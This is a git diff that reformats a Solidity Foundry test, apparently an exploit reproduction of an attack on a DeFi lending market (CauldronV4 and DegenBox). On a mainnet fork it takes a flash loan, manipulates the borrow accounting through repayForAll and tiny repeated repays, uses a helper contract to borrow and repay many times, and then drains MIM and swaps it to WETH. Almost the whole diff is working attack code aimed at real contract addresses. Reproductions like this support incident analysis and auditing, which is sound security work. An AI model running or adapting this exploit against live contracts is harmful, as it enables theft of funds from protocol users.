@@ -19,13 +19,7 @@ import "./../interface.sol";
 interface IDegenBox {
     function balanceOf(address, address) external view returns (uint256);
 
-    function flashLoan(
-        address borrower,
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes memory data
-    ) external;
+    function flashLoan(address borrower, address receiver, address token, uint256 amount, bytes memory data) external;
 
     function deposit(
         address token_,
@@ -47,55 +41,35 @@ interface IDegenBox {
 interface ICauldronV4 {
     function addCollateral(address to, bool skim, uint256 share) external;
 
-    function borrow(
-        address to,
-        uint256 amount
-    ) external returns (uint256 part, uint256 share);
+    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
 
-    function repay(
-        address to,
-        bool skim,
-        uint256 part
-    ) external returns (uint256 amount);
+    function repay(address to, bool skim, uint256 part) external returns (uint256 amount);
 
     function repayForAll(uint128 amount, bool skim) external returns (uint128);
 
-    function userBorrowPart(address) external view returns (uint256);
+    function userBorrowPart(
+        address
+    ) external view returns (uint256);
 
-    function totalBorrow()
-        external
-        view
-        returns (uint128 elastic, uint128 base);
+    function totalBorrow() external view returns (uint128 elastic, uint128 base);
 }
 
 contract ContractTest is Test {
-    IERC20 private constant MIM =
-        IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
-    IUSDT private constant USDT =
-        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IERC20 private constant Crv3_USD_BTC_ETH =
-        IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
-    IERC20 private constant yvCurve_3Crypto_f =
-        IERC20(0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3);
-    IERC20 private constant USDC =
-        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IERC20 private constant WETH =
-        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IDegenBox private constant DegenBox =
-        IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
-    ICauldronV4 private constant CauldronV4 =
-        ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);
-    ICurvePool private constant MIM_3LP3CRV =
-        ICurvePool(0x5a6A4D54456819380173272A5E8E9B9904BdF41B);
-    ICurvePool private constant USDT_WBTC_WETH =
-        ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
-    Uni_Pair_V3 private constant MIM_USDC =
-        Uni_Pair_V3(0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27);
-    Uni_Pair_V3 private constant USDC_WETH =
-        Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
+    IERC20 private constant MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
+    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20 private constant Crv3_USD_BTC_ETH = IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
+    IERC20 private constant yvCurve_3Crypto_f = IERC20(0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IDegenBox private constant DegenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
+    ICauldronV4 private constant CauldronV4 = ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);
+    ICurvePool private constant MIM_3LP3CRV = ICurvePool(0x5a6A4D54456819380173272A5E8E9B9904BdF41B);
+    ICurvePool private constant USDT_WBTC_WETH = ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
+    Uni_Pair_V3 private constant MIM_USDC = Uni_Pair_V3(0x298b7c5e0770D151e4C5CF6cCA4Dae3A3FFc8E27);
+    Uni_Pair_V3 private constant USDC_WETH = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19118659);
+        vm.createSelectFork("mainnet", 19_118_659);
         vm.label(address(MIM), "MIM");
         vm.label(address(USDT), "USDT");
         vm.label(address(WETH), "WETH");
@@ -111,16 +85,10 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint(
-            "Exploiter MIM balance before attack",
-            MIM.balanceOf(address(this)),
-            MIM.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter MIM balance before attack", MIM.balanceOf(address(this)), MIM.decimals());
 
         emit log_named_decimal_uint(
-            "Exploiter WETH balance before attack",
-            WETH.balanceOf(address(this)),
-            WETH.decimals()
+            "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
 
         MIM.approve(address(DegenBox), type(uint256).max);
@@ -129,25 +97,13 @@ contract ContractTest is Test {
         Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);
         yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);
 
-        DegenBox.flashLoan(
-            address(this),
-            address(this),
-            address(MIM),
-            300_000 * 1e18,
-            ""
-        );
+        DegenBox.flashLoan(address(this), address(this), address(MIM), 300_000 * 1e18, "");
 
         // Exchange MIM to USDT
         MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);
 
         // Obtain USDC tokens
-        MIM_USDC.swap(
-            address(this),
-            true,
-            100_000 * 1e18,
-            75_212_254_740_446_025_735_711,
-            ""
-        );
+        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, "");
 
         // Obtain WETH tokens
         USDC_WETH.swap(
@@ -158,16 +114,10 @@ contract ContractTest is Test {
             ""
         );
 
-        emit log_named_decimal_uint(
-            "Exploiter MIM balance after attack",
-            MIM.balanceOf(address(this)),
-            MIM.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter MIM balance after attack", MIM.balanceOf(address(this)), MIM.decimals());
 
         emit log_named_decimal_uint(
-            "Exploiter WETH balance after attack",
-            WETH.balanceOf(address(this)),
-            WETH.decimals()
+            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
     }
 
@@ -178,18 +128,10 @@ contract ContractTest is Test {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
-        (uint128 elastic, ) = CauldronV4.totalBorrow();
-        uint128 amount = uint128(
-            uint128(elastic + uint128(50e18)) - uint128(240_000 * 1e18)
-        );
+        (uint128 elastic,) = CauldronV4.totalBorrow();
+        uint128 amount = uint128(uint128(elastic + uint128(50e18)) - uint128(240_000 * 1e18));
 
-        DegenBox.deposit(
-            address(MIM),
-            address(this),
-            address(DegenBox),
-            amount,
-            0
-        );
+        DegenBox.deposit(address(MIM), address(this), address(DegenBox), amount, 0);
         MIM.transfer(address(CauldronV4), 240_000 * 1e18);
         CauldronV4.repayForAll(uint128(240_000 * 1e18), true);
 
@@ -221,7 +163,7 @@ contract ContractTest is Test {
         handleSpecialUser();
 
         // Exchange portion of MIM balance for USDT
-        MIM_3LP3CRV.exchange_underlying(0, 3, 2_000 * 1e18, 0);
+        MIM_3LP3CRV.exchange_underlying(0, 3, 2000 * 1e18, 0);
 
         // Add exchanged USDT amount as liquidity to the pool. Receive (mint) Crv3_USD_BTC_ETH in return
         uint256[3] memory amounts;
@@ -229,45 +171,27 @@ contract ContractTest is Test {
         amounts[1] = 0;
         amounts[2] = 0;
         // USDT_WBTC_WETH.add_liquidity(amounts, 0);
-        (bool success, ) = address(USDT_WBTC_WETH).call(
-            abi.encodeWithSelector(bytes4(0x4515cef3), amounts, 0)
-        );
+        (bool success,) = address(USDT_WBTC_WETH).call(abi.encodeWithSelector(bytes4(0x4515cef3), amounts, 0));
         require(success);
 
         // yvCurve_3Crypto_f.deposit(Crv3_USD_BTC_ETH.balanceOf(address(this)));
-        (success, ) = address(yvCurve_3Crypto_f).call(
-            abi.encodeWithSelector(
-                bytes4(0xb6b55f25),
-                Crv3_USD_BTC_ETH.balanceOf(address(this))
-            )
+        (success,) = address(yvCurve_3Crypto_f).call(
+            abi.encodeWithSelector(bytes4(0xb6b55f25), Crv3_USD_BTC_ETH.balanceOf(address(this)))
         );
         require(success);
 
         // Deposit yvCurve_3Crypto_f balance
         uint256 depositAmount = yvCurve_3Crypto_f.balanceOf(address(this));
-        DegenBox.deposit(
-            address(yvCurve_3Crypto_f),
-            address(this),
-            address(CauldronV4),
-            depositAmount,
-            0
-        );
+        DegenBox.deposit(address(yvCurve_3Crypto_f), address(this), address(CauldronV4), depositAmount, 0);
 
         HelperExploitContract helper = new HelperExploitContract();
         // borrow and repay * 90x
         helper.exploit();
 
         CauldronV4.addCollateral(address(this), true, depositAmount - 100);
-        CauldronV4.borrow(
-            address(this),
-            DegenBox.balanceOf(address(MIM), address(CauldronV4))
-        );
+        CauldronV4.borrow(address(this), DegenBox.balanceOf(address(MIM), address(CauldronV4)));
         DegenBox.withdraw(
-            address(MIM),
-            address(this),
-            address(this),
-            DegenBox.balanceOf(address(MIM), address(this)),
-            0
+            address(MIM), address(this), address(this), DegenBox.balanceOf(address(MIM), address(this)), 0
         );
 
         // Repaying flashloan
@@ -275,11 +199,7 @@ contract ContractTest is Test {
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
-    function uniswapV3SwapCallback(
-        int256 amount0Delta,
-        int256 amount1Delta,
-        bytes calldata data
-    ) external {
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
         if (msg.sender == address(MIM_USDC)) {
             MIM.transfer(address(MIM_USDC), uint256(amount0Delta));
         } else {
@@ -294,14 +214,13 @@ contract ContractTest is Test {
         for (uint8 i; i < 3; ++i) {
             CauldronV4.repay(specialUser, true, 1);
         }
-        (uint128 elastic, ) = CauldronV4.totalBorrow();
+        (uint128 elastic,) = CauldronV4.totalBorrow();
         require(elastic == 0);
     }
 }
 
 contract HelperExploitContract {
-    ICauldronV4 private constant CauldronV4 =
-        ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);
+    ICauldronV4 private constant CauldronV4 = ICauldronV4(0x7259e152103756e1616A77Ae982353c3751A6a90);
 
     function exploit() external {
         CauldronV4.addCollateral(address(this), true, 100);
